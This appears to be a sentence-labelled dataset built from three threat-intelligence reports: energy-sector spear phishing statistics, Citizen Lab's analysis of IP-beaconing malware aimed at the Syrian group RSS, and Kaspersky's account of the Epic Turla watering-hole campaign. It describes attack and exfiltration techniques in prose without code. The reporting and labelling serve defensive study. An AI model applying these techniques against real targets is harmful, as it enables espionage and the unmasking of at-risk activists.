It is evident that most attackers are carefully selecting the themes that they use for their attacks .	0
Some groups use real news stories and copy the text directly from the newspaper websites .	0
Others try to appeal to personal hobbies in order to get the user 's attention .	0
In the energy sector the most commonly used theme for spear phishing emails was money related ( e.g .	0
'' Wage Data 2012 '' ) followed by sports related themes ( e.g .	0
'' 2012-13 NFL Playoffs Schedule '' ) .	0
As an example , the subject line '' Wage Data 2012 '' was used in 944 emails , sent from 26 different email addresses to targets in nine different sectors .	1
The attack was carried out over eight days and used the same infected Microsoft Word document in every instance .	1
In general any topic can be used in a social engineering attempt , which makes it even harder for regular users to spot the attacks .	0
Here are a few examples of subject lines used , listed by category : In the last six month of 2012 the average number of targeted attacks observed per day was 87 ( with 14 in the energy sector ) .	0
In the first six month of 2013 the average number decreased to 60 targeted attacks per day ( five in the energy sector ) .	0
The spike in August and September 2012 is mostly related to a large scale attack against a global oil company .	0
The increase in May 2013 was due to multiple attacks against financial services , public sector and IT service organizations .	0
The government and public sector was quantitatively the most attacked sector , with 25.4 percent of all targeted attacks falling in this sector for the last half of 2012 and 24 percent for the first half of 2013 .	0
The energy sector accounted for 7.6 percent of all targeted attacks , making it the fifth most targeted sector in the first six month of 2013 .	0
This was a big decrease from 16.3 percent of all attacks in the last half of 2012 , when it was the second most attacked sector .	0
This spike in 2012 is mainly due to a large attack campaign against a global oil company which took place in September 2012 .	0
On average we saw 18.6 mail accounts being attacked for any given target company in the last half of 2012 ( 60.7 in the energy sector ) and 5.6 email accounts in the first half of 2013 ( 10 in the energy sector ) .	0
Overall , we see a trend of the attacker conducting more focused attacks against fewer individuals .	0
This generates less noise and the risk of getting noticed or discovered is smaller .	0
These emails are sent in small bursts and then repeated against a changing target space till enough computers are compromised .	0
Half of all the attachments analyzed used an extension that would run directly when double clicked .	0
This old method is still the most common scheme used .	0
Of all attachments analyzed , 38 percent were .exe	0
and 12 percent were .src	0
files .	0
In total only 6 percent used double extensions like .pdf.exe	0
to fool the user .	0
It should also be noted that 23 percent were Microsoft Word documents using some exploit to execute custom code on the computer .	0
There were also some more exotic extensions used like AutoIt scripts ( .au3	0
) and ZX-Edit files ( .zed	0
) , but these are the exception rather than the rule .	0
It might be that the attackers tried to bypass some email filtering software by experimenting with different attachment types .	0
Sometimes even older exploits like the Microsoft DirectX DirectShow Length Record Remote Code Execution Vulnerability ( CVE- 2009-1539 ) in .mp4	0
files are still occasionally used .	0
This indicates that either not all attackers have the knowhow to use newer exploits that are publicly available or they speculate that the target has not patched all computers .	0
Some of the attackers do not seem to be too sophisticated .	0
For example they used '' www .	0
[ COMPANY-NAME ] .com.exe	0
'' as an attachment name , clearly missing that the '' .com	0
'' at the end would be sufficient to run it and the additional '' .exe	0
'' was not needed .	0
To identify a series of targeted attacks that are likely performed by the same individuals , we have used a novel attack attribution methodology named TRIAGE .	0
Developed by Symantec Research Labs , TRIAGE is data mining software that relies on multi-criteria decision analysis and intelligent data fusion algorithms to reliably link different attacks to the same source .	0
This framework has been developed in order to automate cyberintelligence tasks and reduce the time needed to get insights into organized cybercrime activities .	0
By enabling rapid analysis of large security data sets , Symantec analysts can then quickly and more efficiently attribute various waves of cyberattacks to a specific attack campaign likely run by the same individuals .	0
The TRIAGE framework was recently enhanced with novel visualizations thanks to VIS-SENSE , a European research project aiming at developing visual analytics technologies for network security applications .	0
Since its original conception , TRIAGE has been successfully used to analyze the behavior of cybercriminals involved in various types of Internet attack activities , such as rogue antivirus websites , spam botnets operations , scam campaigns and targeted attacks performed via spear phishing emails .	0
As with any other targeted attacks , attacks against the energy sector often follow the same pattern .	0
It can be broken down in different phases of attack .	0
It should be noted that we have seen attackers modify their behavior and exceptions from the norm and this is possible especially if the target company has special circumstances or security measures in place .	0
During this phase the attacker tries to learn as much as possible about the targeted organization .	0
Information sources often include social networks , job posting sites and press releases .	0
This enables the attacker to learn the contact details of possible target individuals as well as context that can be used in social engineering scenarios .	0
The attacker will often create a list of implemented security software used at the targeted company from whatever information is available .	0
These investigations often start completely passively without any direct contact with the company , since there are many data sources publicly available .	0
Subsequently the attacker can use more interaction if needed .	0
Some attackers go through all the effort of creating a fake social media account and befriending key employees .	0
After a period of small talk , to create a false sense of security , such a connection can then be used to pass on an infected document or find out about some key information .	0
Depending on the targeted location , physical reconnaissance and eavesdropping may also be used .	0
The actual break-in occurs during this phase .	0
The attacker usually compromises the network by delivering targeted malware to vulnerable systems or employees .	1
There are two main avenues of attack .	0
One is to send spear phishing emails , where a link to a malicious website or a malicious attachment is delivered using social engineering techniques .	1
The second method , which is gaining traction , is watering hole attacks , where the attacker infects a website that has a high likelihood of being visited by the intended victim .	1
By using IP address filters before infecting any visitor of such sites , the attacker can reduce the number of infected systems and bring it to a manageable quantity which can be assessed manually at another time .	1
Some groups carefully plan watering hole attacks .	1
For example the Hidden Lynx group stopped using a zero-day vulnerability in a large watering hole attack after Microsoft released details on the vulnerability .	0
This helped to cover their activities and avoid unwanted attention .	0
A few days later the group resumed the watering hole attack again , this time using a different exploit .	1
For more difficult targets , man-in-the-middle attacks can be used .	0
These can be performed either at the same physical location , posing as a genuine Wi-Fi hotspot or through supply chain attacks .	1
This can enable the attacker to swap an update of legitimate software for a maliciously crafted version .	1
Once the victim installs the genuine looking update , the attacker effectively gains control over the computer .	1
Due to the complexity of such an attack , they are rarely used .	0
Depending on the skills of the attacker and the time available , the attacker might also attack systems at the perimeter , such as Web servers , and try to break in from there .	0
The malware used is not always sophisticated .	0
Sometimes a regular off-the-shelf back door Trojan is used .	1
In these cases the person behind the malware orchestrating the commands is what makes the difference between a targeted attack and a broad generic infection .	0
Having said this , on very unique targets , we will often see the use of a specifically designed piece malware , such as in the case of Stuxnet .	0
Depending on the protection measures implemented by the target , the attackers may also digitally sign their malware creation .	0
In the past there have been quite a few cases where code signing certificates were stolen and later misused to sign malware in order to pass it unnoticed to high value targets .	0
Once the attacker has a foothold on one system , the next step is to create a plan for lateral movement through the network until the interesting data is found .	0
With more specialized teams of attackers , we can often observe that the infected system is first analyzed to ensure that it is of interest to them .	1
With watering hole attacks especially , it can happen that computers that were not targeted get infected .	0
Infected computers need to be assessed by the attacker and , if necessary , removed to keep the profile , and with that the chances of exposure , low .	0
One of the obvious tasks performed by attackers is to install key loggers , dump local credentials , search local storage for saved accounts and sniff the network for passwords .	1
Any account detail can be useful to them .	0
Domain administrator passwords are of especially high value , as they can help greatly in moving further through the Intranet .	0
Often small scripts or even manual commands are used to comb through local files and create network mappings .	1
Simple system commands can help the attacker to learn about installed security tools , saved links to internal platforms and local address books .	1
Once new systems are identified the attacker will attempt to hop onto them as well .	0
In some instances they might even use zero-day vulnerabilities to spread further into the network .	1
One method which is gaining more relevance is the hijacking of local software distribution systems for further distribution .	1
This can either be proprietary systems , such as the case of Trojan.Jokra in South Korea , or OS-specific , such as hijacking Windows Update , in the case of Flamer .	0
Once the attackers have successfully managed to create and distribute their own package , they can easily infect all connected systems at once .	1
Especially in cases of wiping attacks , such Trojan.Jokra , this is a very efficient way to disrupt as many computers as possible .	0
If the target is assumed to be in a separated network not connected to the Internet , the malware used might try and autonomously infect removable drives , like USB sticks , or project files for PLCs .	1
This could allow the malware to be manually introduced to the destination network , without the knowledge of the carrier , essentially jumping air gaps into isolated networks .	1
At the end of the discovery phase the attackers should know the internals of the infected networks and have identified systems with interesting data or with connected industrial control systems .	1
The capture and exfiltration phases are not always present .	0
If the sole goal of the attackers is to cause a disruption they may directly jump to a destructive payload .	0
However , in most cases information is extracted first , which in turn allows the sabotage to be constructed more efficiently at a later phase .	0
In this phase the interesting data is gathered and sent back to the attackers .	1
This can be done with different levels of sophistication .	0
The simple attacks compress the files and upload them through FTP or through a HTTP POST request to a remote drop server .	1
More sophisticated attackers obfuscate the data by XOR-ing it , encrypting it with proper asymmetric encryption or embedding it into media files using steganography to hide the data from traffic inspection .	1
In addition to this , the amount of data sent and the timing can be chosen in a smart way .	0
For example , some malware samples will send the data in smaller bursts so as not to swamp the network or generate network spikes that might attract attention .	1
Since most employees use laptops , the malware can use location awareness to detect if the compromised computer is outside of the corporate network and send the data once it 's directly connected to the Internet , such as from a Wi-Fi hotspot at an airport .	1
This might allow the traffic to bypass perimeter security and receive less scrutiny .	1
In some instances the infected computer might not have a direct connection to the Internet .	0
In such cases , a previously compromised computer in the DMZ can act as a proxy , forwarding all the collected data .	1
This is when any destructive payload is launched .	0
If the attackers are only after information this phase might not happen at all .	0
The targets and the goals for disruption attacks can be very different , there is no such thing as one- size-fits-all for disruption attacks .	0
For example , Stuxnet was tailored to attack a specific uranium enrichment facility and would not work against a different target .	0
In recent times , wiper Trojans have been popular in attacks against the energy sector .	0
The malware deletes all files on a computer and then deletes the master boot record , rendering the computer unusable .	1
This can happen on any operating systems and we have seen scripts for different UNIX flavors being used as well .	0
Depending on the disaster recovery plan in place , these computers can be remotely recovered .	0
However , there may still be an outage while the computers are being restored .	0
by John Scott-Railton and Seth Hardy With the collaboration of Cyber Arabs .	0
Media coverage : Associated Press , Forbes This report describes a malware attack with circumstantial links to the Islamic State in Iraq and Syria .	0
In the interest of highlighting a developing threat , this post analyzes the attack and provides a list of Indicators of Compromise .	0
A Syrian citizen media group critical of Islamic State of Iraq and Syria ( ISIS ) was recently targeted in a customized digital attack designed to unmask their location .	0
The Syrian group , Raqqah is being Slaughtered Silently ( RSS ) , focuses its advocacy on documenting human rights abuses by ISIS elements occupying the city of Ar- Raqah .	0
In response , ISIS forces in the city have reportedly targeted the group with house raids , kidnappings , and an alleged assassination .	0
The group also faces online threats from ISIS and its supporters , including taunts that ISIS is spying on the group .	0
Though we are unable to conclusively attribute the attack to ISIS or its supporters , a link to ISIS is plausible .	0
The malware used in the attack differs substantially from campaigns linked to the Syrian regime , and the attack is focused against a group that is an active target of ISIS forces .	0
As the Syrian Civil War continues , Syrian citizen journalists and nonviolent activists operate in an increasingly unsafe environment .	0
The regime has never welcomed their work , and has often targeted them for arrest and detention , and a multi-year hacking campaign ( see Pro-Regime / Regime Linked Groups ) .	0
Additionally , not all elements of the Syrian opposition have uniformly supported nonviolent activists and citizen journalists .	0
More recently , in areas like Raqqah , nonviolent activists face a new and exceptionally grave threat : ISIS .	0
A growing number of reports suggest that ISIS is systematically targeting groups that document atrocities , or that communicate with Western media and aid organizations , sometimes under the pretext of finding '' spies '' .	0
Ar-Raqqah , the city in which the case study is located , is situated in northern Syria and continues to be a key conflict flashpoint of the Syrian Civil War .	0
In the spring of 2013 , Islamists and Free Syrian Army ( FSA ) fighters took over Ar- Raqqah from regime forces .	0
As ISIS gained momentum , they consolidated their control over the city , edging out FSA- affiliated groups through attacks , summary executions , and kidnappings against a range of groups , including ethnic and religious minorities .	0
During 2014 , there were a number of reports-many unconfirmed-that ISIS confiscated smartphones and laptops from captured activists .	0
According to Syrians who experienced these searches and spoke with one of the reports ' authors , ISIS sometimes extracts data from confiscated smartphones and laptops to collect information about people and groups they are targeting , as well as to seek evidence of '' un-Islamic '' activities .	0
As ISIS cements their control of Ar-Raqqah and other territories , reports have emerged recently ( though not all of them confirmed ) suggesting that elements within ISIS are growing increasingly sophisticated at imposing control and targeting opponents using digital methods .	0
Reports about ISIS targeting Internet cafés have grown increasingly common , and in some cases reports point to the possible use of keyloggers as well as unspecified '' IP sniffers '' to track behaviour in Internet cafes .	0
Nonviolent activists and citizen journalists based in Ar-Raqqah have provided the outside world with much of what we know about how ISIS treats the population .	0
These activists and journalists face mortal danger for their actions , and reports have emerged of their detention and torture at the hands of ISIS .	0
As ISIS continues to use social media to push the message that it is welcomed by the population of Ar-Raqqah , groups like Raqqah is being Slaughtered Silently ( RSS ) provide a compelling counter narrative .	0
RSS has n't escaped ISIS ' notice , and the group has been targeted for kidnappings , house raids , and at least one alleged targeted killing .	0
At the time of writing , ISIS is allegedly holding several citizen journalists in Ar-Raqqah .	0
In addition , RSS is targeted online by ISIS supporters with harassment , including threats to the physical safety of its members .	0
For example , ISIS supporters have claimed that ISIS has established a system of CCTV cameras in Ar-Raqqah to observe residents ' movements .	0
While this claim may be a bluff or exaggeration , at least one ISIS supporter has indicated on social media that this system could be used to look for members of RSS .	0
This section describes a highly targeted attack sent to an e-mail address belonging to RSS .	1
The Citizen Lab analyzed this attack with the consent of RSS , which requested that their name be used in this report .	0
The attack took the form of an unsolicited e-mail containing a download link to a decoy file .	1
The file contained custom malware that profiled the victim 's computer and beaconed its IP address to an e-mail account under the attacker 's control .	1
The unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address .	1
The message was carefully worded , and contained references specific to the work and interests of RSS .	0
Thank you for your efforts to deliver a true picture of the reality of life in Raqqah .	0
As Syrians residing in Canada we are working with media because we believe in the importance of shedding light on the realities of life in Syria , and Raqqah in particular .	0
We are preparing a lengthy news report on the realities of life in Raqqah .	0
We are sharing some information with you with the hope that you will correct it in case it contains errors .	0
We have prepared a map of the city of Raqqah , in addition to a preliminary report .	0
We hope that you have a look at it with them and inform us of any errors .	0
We also hope that if you happen to be on Facebook , you could provide us with the account of the person responsible for the campaign , if you do n't mind , so that we can communicate with him directly .	0
You can see a preliminary copy of the report on this linkhttp : //tempsend [ DOT ] com/ [ Redacted ] With all respect [ Name Redacted ] We are unsure why the attacker specifically mentions Canada in the email lure .	0
However , it is well known that Syria's extensive diaspora ( including in Canada ) regularly engages in advocacy , sometimes in coordination with groups within Syria .	0
Thus , the message is not on its face implausible .	0
However , we note that the attacker also attempts to social engineer the identity of individuals working with RSS , by requesting a personal Facebook page .	1
The custom malware used in this attack infects a user who views the decoy '' slideshow , '' and beacons home with the IP address of the victim 's computer and details about his or her system each time the computer restarts .	1
Unlike Syrian regime-linked malware , it contains no Remote Access Trojan ( RAT ) functionality , suggesting it is intended for identifying and locating a target .	1
Further , because the malware sends data captured by the malware to an e-mail address , it does not require that the attackers maintain a command-and-control server online .	1
This functionality would be especially useful to an adversary unsure of whether it can maintain uninterrupted Internet connectivity .	0
Accessing the link provided in the malicious e-mail sends the user to a .zip	0
file hosted on file-sharing site tempsend.com .	0
At the time of writing the file had been downloaded only 10 times This file is a self-extracting archive with an icon intended to suggest to the victim that it is itself a slideshow .	0
When run , the file opens a slideshow of Google Earth screen captures to the victim , displaying a series of locations in Syria , and highlighting an '' ISIS HQ '' and other images showing the alleged locations of US airstrikes .	0
Examples of images in the slideshow as follows : When opened , the '' slideshow.zip '' file writes and executes several files : '' AdobeR1.exe '' is malicious , while '' pictures.exe '' is the genuine slideshow displayed to the victim .	1
When the slideshow is closed both AdobeR1.exe and pictures.exe are deleted .	1
The AdobeR1 file writes a series of executable files that perform information collection and communication functions , including : The program sequence of data collection and sending is somewhat unusual , with each program performing a single task and communicating via markers left in the registry .	1
Programs appear to make use of the Visual C++ Runtime Library .	0
First , the program nvidrv adds itself to autorun : It also creates a series of registry keys that the individual programs use to communicate : Registry keys and programs using them : It then runs GooglUpd , which cleans up the program files if they exist , and runs AdbrRader .	1
AdbrRader ( communicating through registry key '' 2 '' ) writes the file vgadmysadm.tmp with the name of another registry key '' 2 '' with startup info .	1
Next , nvidrv runs GoogleUpate , which collects system information and writes it to : Then nvidrv runs nvisdvr ( registry key '' 4 '' ) that collects a list of running processes , which are written to : Finally , nvidrv runs svhosts , which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com .	1
It then runs rundl132 if it has not before , by checking whether registry key name '' 6 '' is present .	1
It sets the key to '' 0 '' and runs it .	1
Next , '' rundl132.exe '' performs an HTTP GET request to myexternalip.com and collects the external IP of the infected machine : Next , rundl132 writes : Then rundl132 writes the external IP to : Finally , rundl132 runs AdobeIns , which zips the contents of the win32.tmp folder .	1
Program '' AdobeIns.exe '' takes the files written by the other programs and zips them in an encrypted , password- protected file : Data is transmitted by e-mail to an account presumably controlled by the attacker .	1
AdobeIns connects to an account at the online e-mail provider inbox.com via smtp using hardcoded credentials .	1
The malware then sends an e-mail to the same inbox containing the text '' Hello '' and with mxtd file attached .	1
SMTP traffic generated by the malware to inbox.com ( with redactions ) The malware seen in this case study is unusual as it relies on a half-dozen separate executable files , each with a single task , and each communicating via markers dropped in the Registry .	1
The malware is also interesting because it does not provide remote access , but only sends an e-mail containing the victim 's IP address and miscellaneous system information .	1
The malware resends the information each time the computer is restarted , but it does not refresh the sent information on restart ( which may be a bug ) .	1
This behaviour strongly suggests that the function of this malware is to serve as a beacon .	1
The system information could be used to identify processes to exploit in the future , however since the attacker has already triggered the execution of a file on the victim 's system , it is surprising that more was not taken , or that a RAT ( custom or widely available ) was not used .	1
A RAT would have provided much greater access alongside IP information By not providing remote access and other RAT functionality , the program looks less like malware , and may attract less attention from endpoint protection tools and scanners .	1
Detections were low when the file was first submitted to VirusTotal , for example .	0
It registered only 6/55 detections by anti virus scanners , or a 10 % detection rate .	1
Transmitting the malware via e-mail also provides a degree of obscurity , and has the additional advantage of providing a layer of abstraction between the attacker and the target : there is no need to maintain a RAT command-and-control server .	1
The malware transmits autonomously , leaving the material in an inbox for the attacker to collect at a later time .	1
The malware has no obfuscation processes and is not highly technical in its development or interaction with Windows .	0
Nevertheless , we believe that the author of the program is aware of certain techniques to reduce the visibility of malware on a network , including transmitting data via encrypted e-mail communications .	1
However , the attacker has not correctly implemented encrypted e-mail : the malware will not attempt to use a TLS connection in certain cases .	0
As a result , account login credentials may be readily available in network traffic .	0
In addition , the malware uses the old PKWARE implementation of zip encryption , which is not particularly secure .	1
The password for the zipped file is also present in the binary without encryption or obfuscation .	0
Citizen Lab researchers have developed the Targeted Threat Index ( TTI ) as a tool to standardize information about the sophistication of targeted threats against civil society groups in our research .	0
The index captures information about the level of social engineering used ( '' Targeting Sophistication '' ) , and adds a Technical Sophistication value for the attack as a multiplier .	0
This attack , which has little technical sophistication ( i.e. , it uses no exploits , code obfuscation , or techniques to frustrate reversing , etc .	1
) , nevertheless has carefully developed social engineering in the seeding materials and bait document .	1
Taken together it rates a 3 for Targeting Sophistication and a 1.25 for Technical Sophistication by our metric , yielding a TTI score of 3.75 .	0
Citizen Lab research using the TTI has found that , despite low levels of technical sophistication , with well-crafted social engineering malware attacks remain highly effective against civil society groups .	0
More information is available about the TTI in a recent Usenix Security paper .	0
There are at least three possible sources for this malware attack : We evaluate each of these possibilities in turn , drawing on the information available to us after almost three years of tracking regime-linked malware .	0
Pro-regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011 .	0
Those campaigns have been extensively reported on by a range of groups , including Kaspersky , FireEye , Citizen Lab , the Electronic Frontier Foundation , and many others .	0
Regime-linked malware has a number of common features that typically serve as distinguishing characteristics : Social engineering focusing on the needs and interests of the opposition .	0
Although targeted , the malware seeding often aims at classes of people ( e.g. , people interested in 'shocking ' news about a fighter , or 'leaked ' information about the Assad regime ) rather than carefully written spear phishing targeting a single individual or small group .	1
Use of widely available RATs ( njRAT , Xtreme Rat , ShadowTech Rat , DarkComet RAT , and Blackshades RAT , among others ) .	1
At least one command-and-control server located within Syrian IP space ( often from a limited range of addresses ) .	1
Frequent use of Dynamic DNS providers like no-ip .	0
Use of '' crypters '' to obscure the binary .	1
These characteristics are not all present in every sample , but we have typically found one or more in almost every binary we have examined that is Syrian regime-linked .	0
This malware attack differs from known regime-linked groups in each of these elements .	0
Not only is it exceptionally targeted , but it is also not a commonly available RAT .	1
Nor does it have RAT functionality .	0
The function of the malware appears to be : identify and unmask the IP address of target ( s ) , and resend them to the attacker with each reboot .	1
In addition , data is sent to an Internet e-mail address , and no crypter is used to obscure the binary .	1
We are aware of only one previous case in Syria in which e-mail was used to transmit data , and that we believed was regime linked .	1
That incident , observed in 2012 , also used hardcoded e-mail to exfiltrate .	1
However , that malware had substantially more functionality than this case : not only did it drop a second stage from a compromised site , but was also included a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype .	1
The lack of overlap in Tactics , Techniques , and Procedures ( TTPs ) between this attack and prior attacks does not rule out Syrian regime-linked attackers .	0
It is possible that regime-linked groups are trying a new approach .	0
However , given that known regime-linked groups continued to remain active during the same date range using familiar TTPs , this scenario seems unlikely .	0
In addition , it would be strange for regime-linked malware groups to undertake significant effort to prepare and send an implant that has significantly less functionality than what they commonly use .	0
Taken together , we find this evidence supports the hypothesis that familiar regime-linked groups did not conduct the attack .	0
RSS operates in territory controlled by ISIS , and has faced extensive targeting by ISIS .	0
Currently , they appear to be directly targeted by ISIS for kidnappings and other retaliation , including executions .	0
In addition , ISIS supporters have explicitly suggested that the group is under surveillance and actively hunted .	0
Together this evidence suggests that ISIS has a strong motivation for using social engineering and/or malware to locate the members of RSS .	0
We think there are several features of the malware attack that align with the needs and constraints of ISIS and its supporters in Ar-Raqqah , more so than other groups , as we understand them .	0
For example : The malware beacons location but does not provide RAT functionality .	1
The seeding attempts to obtain a 'private ' Facebook identity from RSS through social engineering .	1
The malware exfiltrates to an online e-mail account , thus not requiring the attacker to maintain a command-and- control server online .	1
The social media activity of members of RSS is often highly public .	0
Their location and exact membership , however , is secret .	0
We speculate that if an attacker were interested in maintaining long-term surveillance of the activities of RSS they could have employed a RAT .	0
However , if the attacker were interested in unmasking the location of its targets so they could be physically tracked down , collecting IP data and system info would be a more reasonable approach .	0
ISIS or its supporters clearly have a strong interest in the ( rudimentary ) location tracking of the members of RSS that this malware provides .	0
Internet connectivity in Raqqah is extremely limited , and some of it is under ISIS control .	0
Knowing the IP address of a target could quickly narrow down targets to specific locations , and specific Internet services , or Internet cafes in Raqqah .	0
Given that the identities and locations of RSS members are closely guarded , such information would hold significant intelligence value for ISIS .	0
Armed with this kind of information , ISIS could physically harm people within Raqqah ( and it is also possible that they have the ability to operate in some capacity in border areas of Turkey ) .	0
Little is publicly known about the technical capabilities of ISIS and its supporters ; however , reports have begun to emerge suggesting that ISIS is interested in expanding its abilities .	0
In addition , ISIS has reportedly gained the support of at least one individual with some experience with social engineering and hacking : Junaid Hussain ( aka TriCk ) , a former member of teamp0ison hacking team .	0
While Mr. Hussain and associates have reportedly made threats against Western governments , it is possible that he or others working with ISIS have quietly supported an effort to identify the targeted organization , which is a highly visible thorn in the side of ISIS .	0
It is possible that the attack is the product of actors working for unknown purposes and targeting RSS .	0
Given the activities of RSS , however , it is unclear who this might be .	0
It is not possible , for example , to reject the theory that some unknown group within the FSA , or other groups opposing the Assad regime are responsible .	0
Citizen journalists in Ar-Raqqah were previously critical of arbitrary arrests carried out by non-ISIS groups in 2013 .	0
However , it is unclear why those groups , which no longer control Ar-Raqqah , would be interested in RSS in November 2014 .	0
It is likely that third party actors , including several intelligence services , are closely monitoring various actors in the conflict through a range of electronic means .	0
However , there is little reason to suggest that they would use a tailored but technically rudimentary attack to target RSS in particular .	0
After considering each possibility , we find strong but inconclusive circumstantial evidence to support a link to ISIS .	0
However , we are unable to connect this attack directly to ISIS , Mr. Hussain , or other ISIS supporters .	0
If indeed ISIS or its supporters are responsible , it seems reasonable that such an offensive capability may still be in development .	0
We hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its targets .	0
If ISIS is responsible , while this attack targets in-country impediments to ISIS objectives , other targets may include ideological or military adversaries abroad .	0
Whether or not ISIS is responsible , this attack is likely the work of a non-regime threat actor who may be just beginning to field a still-rudimentary capability in the Syrian conflict .	0
The entry costs for engaging in malware attacks in a conflict like the Syrian Civil War are low , and made lower by the fact that the rule of law is nonexistent for large parts of the country .	0
In still other parts ( under regime control ) , malware attacks appear to be state sanctioned .	0
Citizen Lab research into targeted digital threats against civil society confirms that civil society groups face grave threats from targeted malware attacks , despite being under-resourced to defend against them .	0
The case highlighted here is no exception : lack of IT and security resources have made it difficult for the Syrian opposition to address targeted and persistent digital threats against them .	0
In addition , if ISIS is indeed responsible , this case suggests how easy it is for belligerents in a conflict to begin fielding basic offensive digital capabilities , and how quickly the capabilities can be pointed at unarmed civil society groups .	0
This attack was exceptionally targeted , and clearly reflected the work of an actor familiar with the operations of the targeted organization .	1
As most organizations working on issues surrounding Syria are aware , malware delivered with good social engineering is a constant source of danger .	0
This particular attack can be prevented by not opening files sent by unknown persons .	0
However , many attacks in Syria come from hijacked accounts and impersonate people known to the targets .	0
Social engineering remains an unsolved problem , and continues to compromise groups throughout the Syrian opposition and their supporters .	0
This attack reaffirms the dangers posed by social engineering attacks , whether they deliver phishing campaigns or malware .	0
The circumstantial evidence of ISIS involvement suggests that groups working on topics that ISIS considers a threat , and their partner organizations and supporters , should urgently examine their security policies and assess the possible risks to their operations , and the consequences of exposure of sensitive information to ISIS .	0
Even if the link to ISIS turns out to be incorrect , it is possible that this will be a threat in the future .	0
Individuals and groups at risk can also consult materials in Arabic provided by Cyber Arabs including a series of very accessible videos on digital security .	0
The malware files Files dropped by the malware Collected Information Files ( unencrypted ) Exfiltrated file ( encrypted ) Registry Keys Acknowledgements : We are grateful to Cyber Arabs and the Institute for War and Peace Reporting for their critical work and assistance .	0
Special thanks to : several anonymous Syrians , Masashi Crete-Nishihata , Sarah McKune , Morgan Marquis-Boire , Ron Deibert , Bill Marczak , Nart Villeneuve , Irene Poetranto , and Kristen Dennesen .	0
Support for this research is provided by grants from the John D. and Catherine T. MacArthur Foundation and the Ford Foundation .	0
Over the last 10 months , Kaspersky Lab researchers have analyzed a massive cyber-espionage operation which we call '' Epic Turla '' .	0
The attackers behind Epic Turla have infected several hundred computers in more than 45 countries , including government institutions , embassies , military , education , research and pharmaceutical companies .	0
The attacks are known to have used at least two zero-day exploits : We also observed exploits against older ( patched ) vulnerabilities , social engineering techniques and watering hole strategies in these attacks .	0
The primary backdoor used in the Epic attacks is also known as '' WorldCupSec '' , '' TadjMakhal '' , '' Wipbot '' or '' Tavdig '' .	1
When G-Data published on Turla/Uroburos back in February , several questions remained unanswered .	0
One big unknown was the infection vector for Turla ( aka Snake or Uroburos ) .	0
Our analysis indicates that victims are infected via a sophisticated multi-stage attack , which begins with the Epic Turla .	1
In time , as the attackers gain confidence , this is upgraded to more sophisticated backdoors , such as the Carbon/Cobra system .	1
Sometimes , both backdoors are run in tandem , and used to '' rescue '' each other if communications are lost with one of the backdoors .	1
Once the attackers obtain the necessary credentials without the victim noticing , they deploy the rootkit and other extreme persistence mechanisms .	1
The attacks are still ongoing as of July 2014 , actively targeting users in Europe and the Middle East .	0
Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services subscribers .	0
Contact : intelreports @ kaspersky.com The attacks in this campaign fall into several different categories depending on the vector used in the initial compromise : The attackers use both direct spearphishing and watering hole attacks to infect their victims .	1
Watering holes ( waterholes ) are websites of interest to the victims that have been compromised by the attackers and injected to serve malicious code .	0
So far we have n't been able to locate any e-mail used against the victims , only the attachments .	0
The PDF attachments do not show any '' lure '' to the victim when opened , however , the SCR packages sometime show a clean PDF upon successful installation .	0
Some of known attachment names used in the spearphishing attacks are : In some cases , these filenames can provide clues about the type of victims the attackers are targeting .	0
Currently , the Epic attackers run a vast network of watering holes that target visitors with surgical precision .	1
Some of the injected websites include : In total , we observed more than 100 injected websites .	0
Currently , the largest number of injected sites is in Romania .	0
Here 's a statistic on the injected websites : The distribution is obviously not random , and it reflects some of the interests of the attackers .	0
For instance , in Romania many of the infected sites are in the Mures region , while many of the Spanish infected sites belong to local governments ( City Hall ) .	0
Most of the infected sites use the TYPO3 CMS ( see : http : //typo3.org/ ) , which could indicate the attackers are abusing a specific vulnerability in this publishing platform .	0
Injected websites load a remote JavaScript into the victim 's browser : The script '' sitenavigatoin.js '' is a Pinlady-style browser and plugin detection script , which in turn , redirects to a PHP script sometimes called main.php or wreq.php .	1
Sometimes , the attackers register the .JPG	1
extension with the PHP handler on the server , using '' JPG '' files to run PHP scripts : The main exploitation script '' wreq.php '' , '' main.php '' or '' main.jpg '' performs a numbers of tasks .	1
We have located several versions of this script which attempt various exploitation mechanisms .	1
One version of this script attempts to exploit Internet Explorer versions 6 , 7 and 8 : Unfortunately , the Internet Explorer exploits have not yet been retrieved .	1
Another more recent version attempts to exploit Oracle Sun Java and Adobe Flash Player : Although the Flash Player exploits could n't be retrieved , we did manage to obtain the Java exploits : The Java files exploit a popular vulnerability , CVE-2012-1723 , in various configurations .	1
The payload dropped by these Java exploits is the following : The Java exploit use a special loader that attempts to inject the final Epic backdoor payload into explorer.exe .	1
The backdoor extracted from the Java exploits has the following C & C hardcoded inside : This C & C is still online at the moment although it redirects to a currently suspended page at '' hxxp : //busandcoachdirectory.com [ .	1
] au '' .	0
For a full list of C & C servers , please see the Appendix .	0
The Epic Turla attackers are extremely dynamic in using exploits or different methods depending on what is available at the moment .	0
Most recently , we observed them using yet another technique coupled with watering hole attacks .	1
This takes advantage of social engineering to trick the user into running a fake Flash Player ( MD5 : 030f5fdb78bfc1ce7b459d3cc2cf1877 ) : In at least one case , they tried to trick the user into downloading and running a fake Microsoft Security Essentials app ( MD5 : 89b0f1a3a667e5cd43f5670e12dba411 ) : The fake application is signed by a valid digital certificate from Sysprint AG : This file was distributed from the Ministry of Foreign Affairs of Tajikistan 's website , at '' hxxp : //mfa [ . ] tj/upload/security.php '' .	1
The file is a .NET	1
application that contains an encrypted resource .	1
This drops the malicious file with the MD5 7731d42b043865559258464fe1c98513 .	1
This is an Epic backdoor which connects to the following C & Cs , with a generic internal ID of 1156fd22- 3443-4344-c4ffff : A full list with all the C & C server URLs that we recovered from the samples can be found in the technical Appendix .	1
The Epic backdoors are commanded by a huge network of hacked servers that deliver command and control functionality .	1
The huge network commanded by the Epic Turla attackers serves multiple purposes .	1
For instance , the motherships function as both exploitation sites and command and control panels for the malware .	1
Here 's how the big picture looks like : The first level of command and control proxies generally talk to a second level of proxies , which in turn , talk to the '' mothership '' server .	1
The mothership server is generally a VPS , which runs the Control panel software used to interact with the victims .	1
The attackers operate the mothership using a network of proxies and VPN servers for anonymity reasons .	0
The mothership also work as the exploitation servers used in the watering hole attacks , delivering Java , IE or fake applications to the victim .	1
